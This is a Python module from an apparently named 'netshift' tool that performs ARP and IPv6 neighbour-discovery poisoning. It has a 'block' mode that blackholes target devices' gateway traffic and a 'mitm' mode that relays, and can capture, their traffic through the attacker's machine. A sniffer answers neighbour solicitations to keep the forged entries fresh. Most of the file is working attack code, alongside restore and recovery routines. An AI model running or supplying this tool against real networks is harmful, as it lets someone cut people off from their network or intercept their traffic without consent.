"""ARP poisoning with a guaranteed path back to a clean network.

Two modes:

``block``  tell each target that the gateway lives at a MAC address that does
           not exist on the LAN. Their frames die at layer 2, the Wi-Fi link
           stays up, nothing is forwarded through this machine.

``mitm``   relay traffic through this machine (``ip_forward=1``) and optionally
           capture it. Intended for showing *why* the attack works.

Every exit path restores the real ARP mappings, and ``netshift heal`` repairs a
network after a hard kill (``kill -9``) using the state file.
"""

from __future__ import annotations

import atexit
import json
import os
import platform
import subprocess
import tempfile
import threading
import time
from dataclasses import asdict, dataclass
from pathlib import Path

from scapy.all import (
    ARP,
    ICMPv6ND_NS,
    AsyncSniffer,
    Ether,
    IPv6,
    getmacbyip,
    sendp,
)

from . import ndp
from .netif import NetInfo

BLACKHOLE_MAC = ndp.BLACKHOLE_MAC
STATE_PATH = Path(tempfile.gettempdir()) / "netshift-state.json"
RESTORE_ROUNDS = 5
RESTORE_GAP = 0.35


@dataclass
class Target:
    ip: str
    mac: str
    deadline: float | None = None  # unix time, or None for "until stopped"
    ip6: str = ""                  # discovered link-local/global address


def _sysctl_key() -> str:
    return "net.inet.ip.forwarding" if platform.system() == "Darwin" else "net.ipv4.ip_forward"


def get_forwarding() -> int:
    try:
        out = subprocess.run(
            ["sysctl", "-n", _sysctl_key()], capture_output=True, text=True, timeout=5
        ).stdout
        return int(out.strip())
    except Exception:
        return 0


def set_forwarding(value: int) -> None:
    try:
        subprocess.run(
            ["sysctl", "-w", f"{_sysctl_key()}={value}"],
            capture_output=True,
            text=True,
            timeout=5,
        )
    except Exception:
        pass


def _send(frames: list, iface: str) -> None:
    if frames:
        sendp(frames, iface=iface, verbose=0)


class Poisoner:
    """Keep a set of devices poisoned until :meth:`stop` is called."""

    def __init__(self, net: NetInfo, mode: str = "block", interval: float = 1.5,
                 ipv6: bool = True) -> None:
        if mode not in ("block", "mitm"):
            raise ValueError("mode must be 'block' or 'mitm'")
        self.net = net
        self.mode = mode
        self.interval = interval
        self.ipv6 = ipv6
        self.targets: dict[str, Target] = {}
        self.gw_mac: str | None = None
        self.router_ip6: str = ""
        self._prev_forward: int | None = None
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._sniffer: AsyncSniffer | None = None
        self._started = False
        self._lock = threading.RLock()

    # -- target management -------------------------------------------------
    def add(self, ip: str, mac: str, deadline: float | None = None) -> None:
        if ip == self.net.gateway:
            raise ValueError("the gateway cannot be a target")
        with self._lock:
            self.targets[ip] = Target(ip=ip, mac=mac.lower(), deadline=deadline)

    def remove(self, ip: str) -> None:
        with self._lock:
            self.targets.pop(ip, None)

    def clear(self) -> None:
        with self._lock:
            self.targets.clear()

    def set_deadline(self, ip: str, deadline: float | None) -> bool:
        """Arm or clear the auto-restore timer for one target."""
        with self._lock:
            target = self.targets.get(ip)
            if target is None:
                return False
            target.deadline = deadline
        self._save_state()
        return True

    @property
    def active(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> None:
        if self.active:
            if self.ipv6:
                self._prepare_ipv6()
                self._save_state()
            return
        self.gw_mac = getmacbyip(self.net.gateway)
        if not self.gw_mac:
            raise RuntimeError("could not learn the gateway MAC (no ARP reply)")

        if self.mode == "mitm":
            self._prev_forward = get_forwarding()
            set_forwarding(1)

        if self.ipv6:
            self._prepare_ipv6()

        self._save_state()
        self._stop.clear()
        self._started = True
        self._thread = threading.Thread(target=self._loop, name="netshift-poison", daemon=True)
        self._thread.start()
        if self.ipv6 and self.router_ip6:
            self._start_ndp_sniffer()
        atexit.register(self.stop)

    def stop(self) -> None:
        """Stop poisoning and put the real ARP mappings back."""
        if not self._started:
            return
        self._started = False
        self._stop.set()
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None
        if self._thread is not None:
            self._thread.join(timeout=3)
            self._thread = None
        self.restore()

    # -- internals ---------------------------------------------------------
    def _prepare_ipv6(self) -> bool:
        """Learn the router's link-local address and one address per target."""
        if not self.ipv6:
            return False
        self.router_ip6 = ndp.default_router(self.net.iface) or self.router_ip6
        if not self.router_ip6:
            return False

        table = ndp.neighbors(self.net.iface)
        if any(not target.ip6 for target in list(self.targets.values())):
            if not table or any(target.mac not in table for target in self.targets.values()):
                table = {**ndp.discover(self.net.iface, self.net.mac), **table}
        for target in list(self.targets.values()):
            if not target.ip6:
                target.ip6 = table.get(target.mac) or ndp.eui64_link_local(target.mac)
        return True

    def _start_ndp_sniffer(self) -> None:
        """Answer neighbour solicitations the moment they are sent.

        The periodic advertisement alone loses races against the real router;
        replying to each NS keeps the forged entry fresh.
        """
        for kwargs in ({"filter": "icmp6"}, {}):
            try:
                self._sniffer = AsyncSniffer(
                    iface=self.net.iface, prn=self._on_neighbor_solicitation,
                    store=0, **kwargs,
                )
                self._sniffer.start()
                return
            except Exception:
                self._sniffer = None

    def _on_neighbor_solicitation(self, packet) -> None:
        try:
            if ICMPv6ND_NS not in packet or IPv6 not in packet or Ether not in packet:
                return
            if not self.router_ip6:
                return
            if str(packet[ICMPv6ND_NS].tgt) != self.router_ip6:
                return
            source_mac = str(packet[Ether].src).lower()
            target = next(
                (t for t in list(self.targets.values()) if t.mac == source_mac), None
            )
            if target is None:
                return
            source_ip = str(packet[IPv6].src)
            if not source_ip:
                return
            _send([ndp.poison_frame(self.net.mac, target.mac, source_ip, self.router_ip6)],
                  self.net.iface)
        except Exception:
            pass

    def _loop(self) -> None:
        last_v6 = time.time()
        while not self._stop.is_set():
            try:
                _send(self._poison_frames(), self.net.iface)
            except Exception:
                pass
            if self.ipv6 and time.time() - last_v6 > 30:
                # addresses change (privacy extensions); fill in the gaps
                try:
                    self._prepare_ipv6()
                except Exception:
                    pass
                last_v6 = time.time()
            self._stop.wait(self.interval)

    def _poison_frames(self) -> list:
        gw = self.net.gateway
        frames = []
        for target in list(self.targets.values()):
            if self.mode == "block":
                frames.append(
                    Ether(dst=target.mac)
                    / ARP(op=2, psrc=gw, hwsrc=BLACKHOLE_MAC, pdst=target.ip, hwdst=target.mac)
                )
            else:
                frames.append(
                    Ether(dst=target.mac)
                    / ARP(op=2, psrc=gw, hwsrc=self.net.mac, pdst=target.ip, hwdst=target.mac)
                )
                frames.append(
                    Ether(dst=self.gw_mac)
                    / ARP(op=2, psrc=target.ip, hwsrc=self.net.mac, pdst=gw, hwdst=self.gw_mac)
                )
        if self.ipv6 and self.router_ip6:
            for target in list(self.targets.values()):
                if target.ip6:
                    frames.append(
                        ndp.poison_frame(self.net.mac, target.mac, target.ip6, self.router_ip6)
                    )
        return frames

    def _restore_frames(self, gateway: str, gateway_mac: str,
                        targets: list[Target] | None = None) -> list:
        frames = []
        for target in (self.targets.values() if targets is None else targets):
            # target: "the gateway is really at gateway_mac"
            frames.append(
                Ether(dst=target.mac)
                / ARP(op=2, psrc=gateway, hwsrc=gateway_mac, pdst=target.ip, hwdst=target.mac)
            )
            # gateway: "the target is really at its own MAC"
            frames.append(
                Ether(dst=gateway_mac)
                / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=gateway, hwdst=gateway_mac)
            )
            # broadcast gratuitous reply, picked up even if the unicast is lost
            frames.append(
                Ether(dst="ff:ff:ff:ff:ff:ff")
                / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff")
            )
            if self.ipv6 and self.router_ip6 and target.ip6:
                frames.append(
                    ndp.restore_frame(self.net.mac, target.mac, target.ip6, self.router_ip6, gateway_mac)
                )
        return frames

    def restore(self) -> None:
        gateway_mac = self.gw_mac or getmacbyip(self.net.gateway)
        if gateway_mac:
            self.gw_mac = self.gw_mac or gateway_mac
            frames = self._restore_frames(self.net.gateway, gateway_mac)
            for _ in range(RESTORE_ROUNDS):
                try:
                    _send(frames, self.net.iface)
                except Exception:
                    pass
                time.sleep(RESTORE_GAP)

        if self._prev_forward is not None:
            set_forwarding(self._prev_forward)
            self._prev_forward = None

        try:
            STATE_PATH.unlink()
        except FileNotFoundError:
            pass

    def restore_target(self, ip: str) -> bool:
        """Restore one device now; the others stay poisoned."""
        with self._lock:
            target = self.targets.pop(ip, None)
        if target is None:
            return False

        gateway_mac = self.gw_mac or getmacbyip(self.net.gateway)
        if gateway_mac:
            self.gw_mac = self.gw_mac or gateway_mac
            frames = self._restore_frames(self.net.gateway, gateway_mac, [target])
            for _ in range(RESTORE_ROUNDS):
                try:
                    _send(frames, self.net.iface)
                except Exception:
                    pass
                time.sleep(RESTORE_GAP)

        if self.targets:
            self._save_state()
        else:
            self.stop()
        return True

    def _save_state(self) -> None:
        data = {
            "pid": os.getpid(),
            "iface": self.net.iface,
            "gateway": self.net.gateway,
            "gateway_mac": self.gw_mac,
            "mode": self.mode,
            "ipv6": self.ipv6,
            "router_ip6": self.router_ip6,
            "prev_forward": self._prev_forward,
            "targets": [asdict(t) for t in list(self.targets.values())],
        }
        STATE_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")
        os.chmod(STATE_PATH, 0o600)


def heal(state_path: Path = STATE_PATH) -> str:
    """Repair the network after an unclean exit. Returns a human summary."""
    if not state_path.exists():
        return "Nothing to heal."
    data = json.loads(state_path.read_text(encoding="utf-8"))
    gateway = data.get("gateway")
    gateway_mac = data.get("gateway_mac") or getmacbyip(gateway)
    iface = data.get("iface")
    targets = [Target(**t) for t in data.get("targets", [])]

    if not gateway_mac:
        return "Gateway MAC not found; the devices recover on their own shortly."

    gateway_ip6 = data.get("router_ip6") or ""
    frames = []
    for target in targets:
        frames.append(
            Ether(dst=target.mac)
            / ARP(op=2, psrc=gateway, hwsrc=gateway_mac, pdst=target.ip, hwdst=target.mac)
        )
        frames.append(
            Ether(dst=gateway_mac)
            / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=gateway, hwdst=gateway_mac)
        )
        frames.append(
            Ether(dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff")
        )
        if gateway_ip6 and target.ip6:
            frames.append(
                ndp.restore_frame(gateway_mac, target.mac, target.ip6, gateway_ip6, gateway_mac)
            )

    for _ in range(RESTORE_ROUNDS):
        try:
            _send(frames, iface)
        except Exception:
            pass
        time.sleep(RESTORE_GAP)

    if data.get("prev_forward") is not None:
        set_forwarding(int(data["prev_forward"]))

    state_path.unlink(missing_ok=True)
    return f"ARP entries restored for {len(targets)} device(s)."
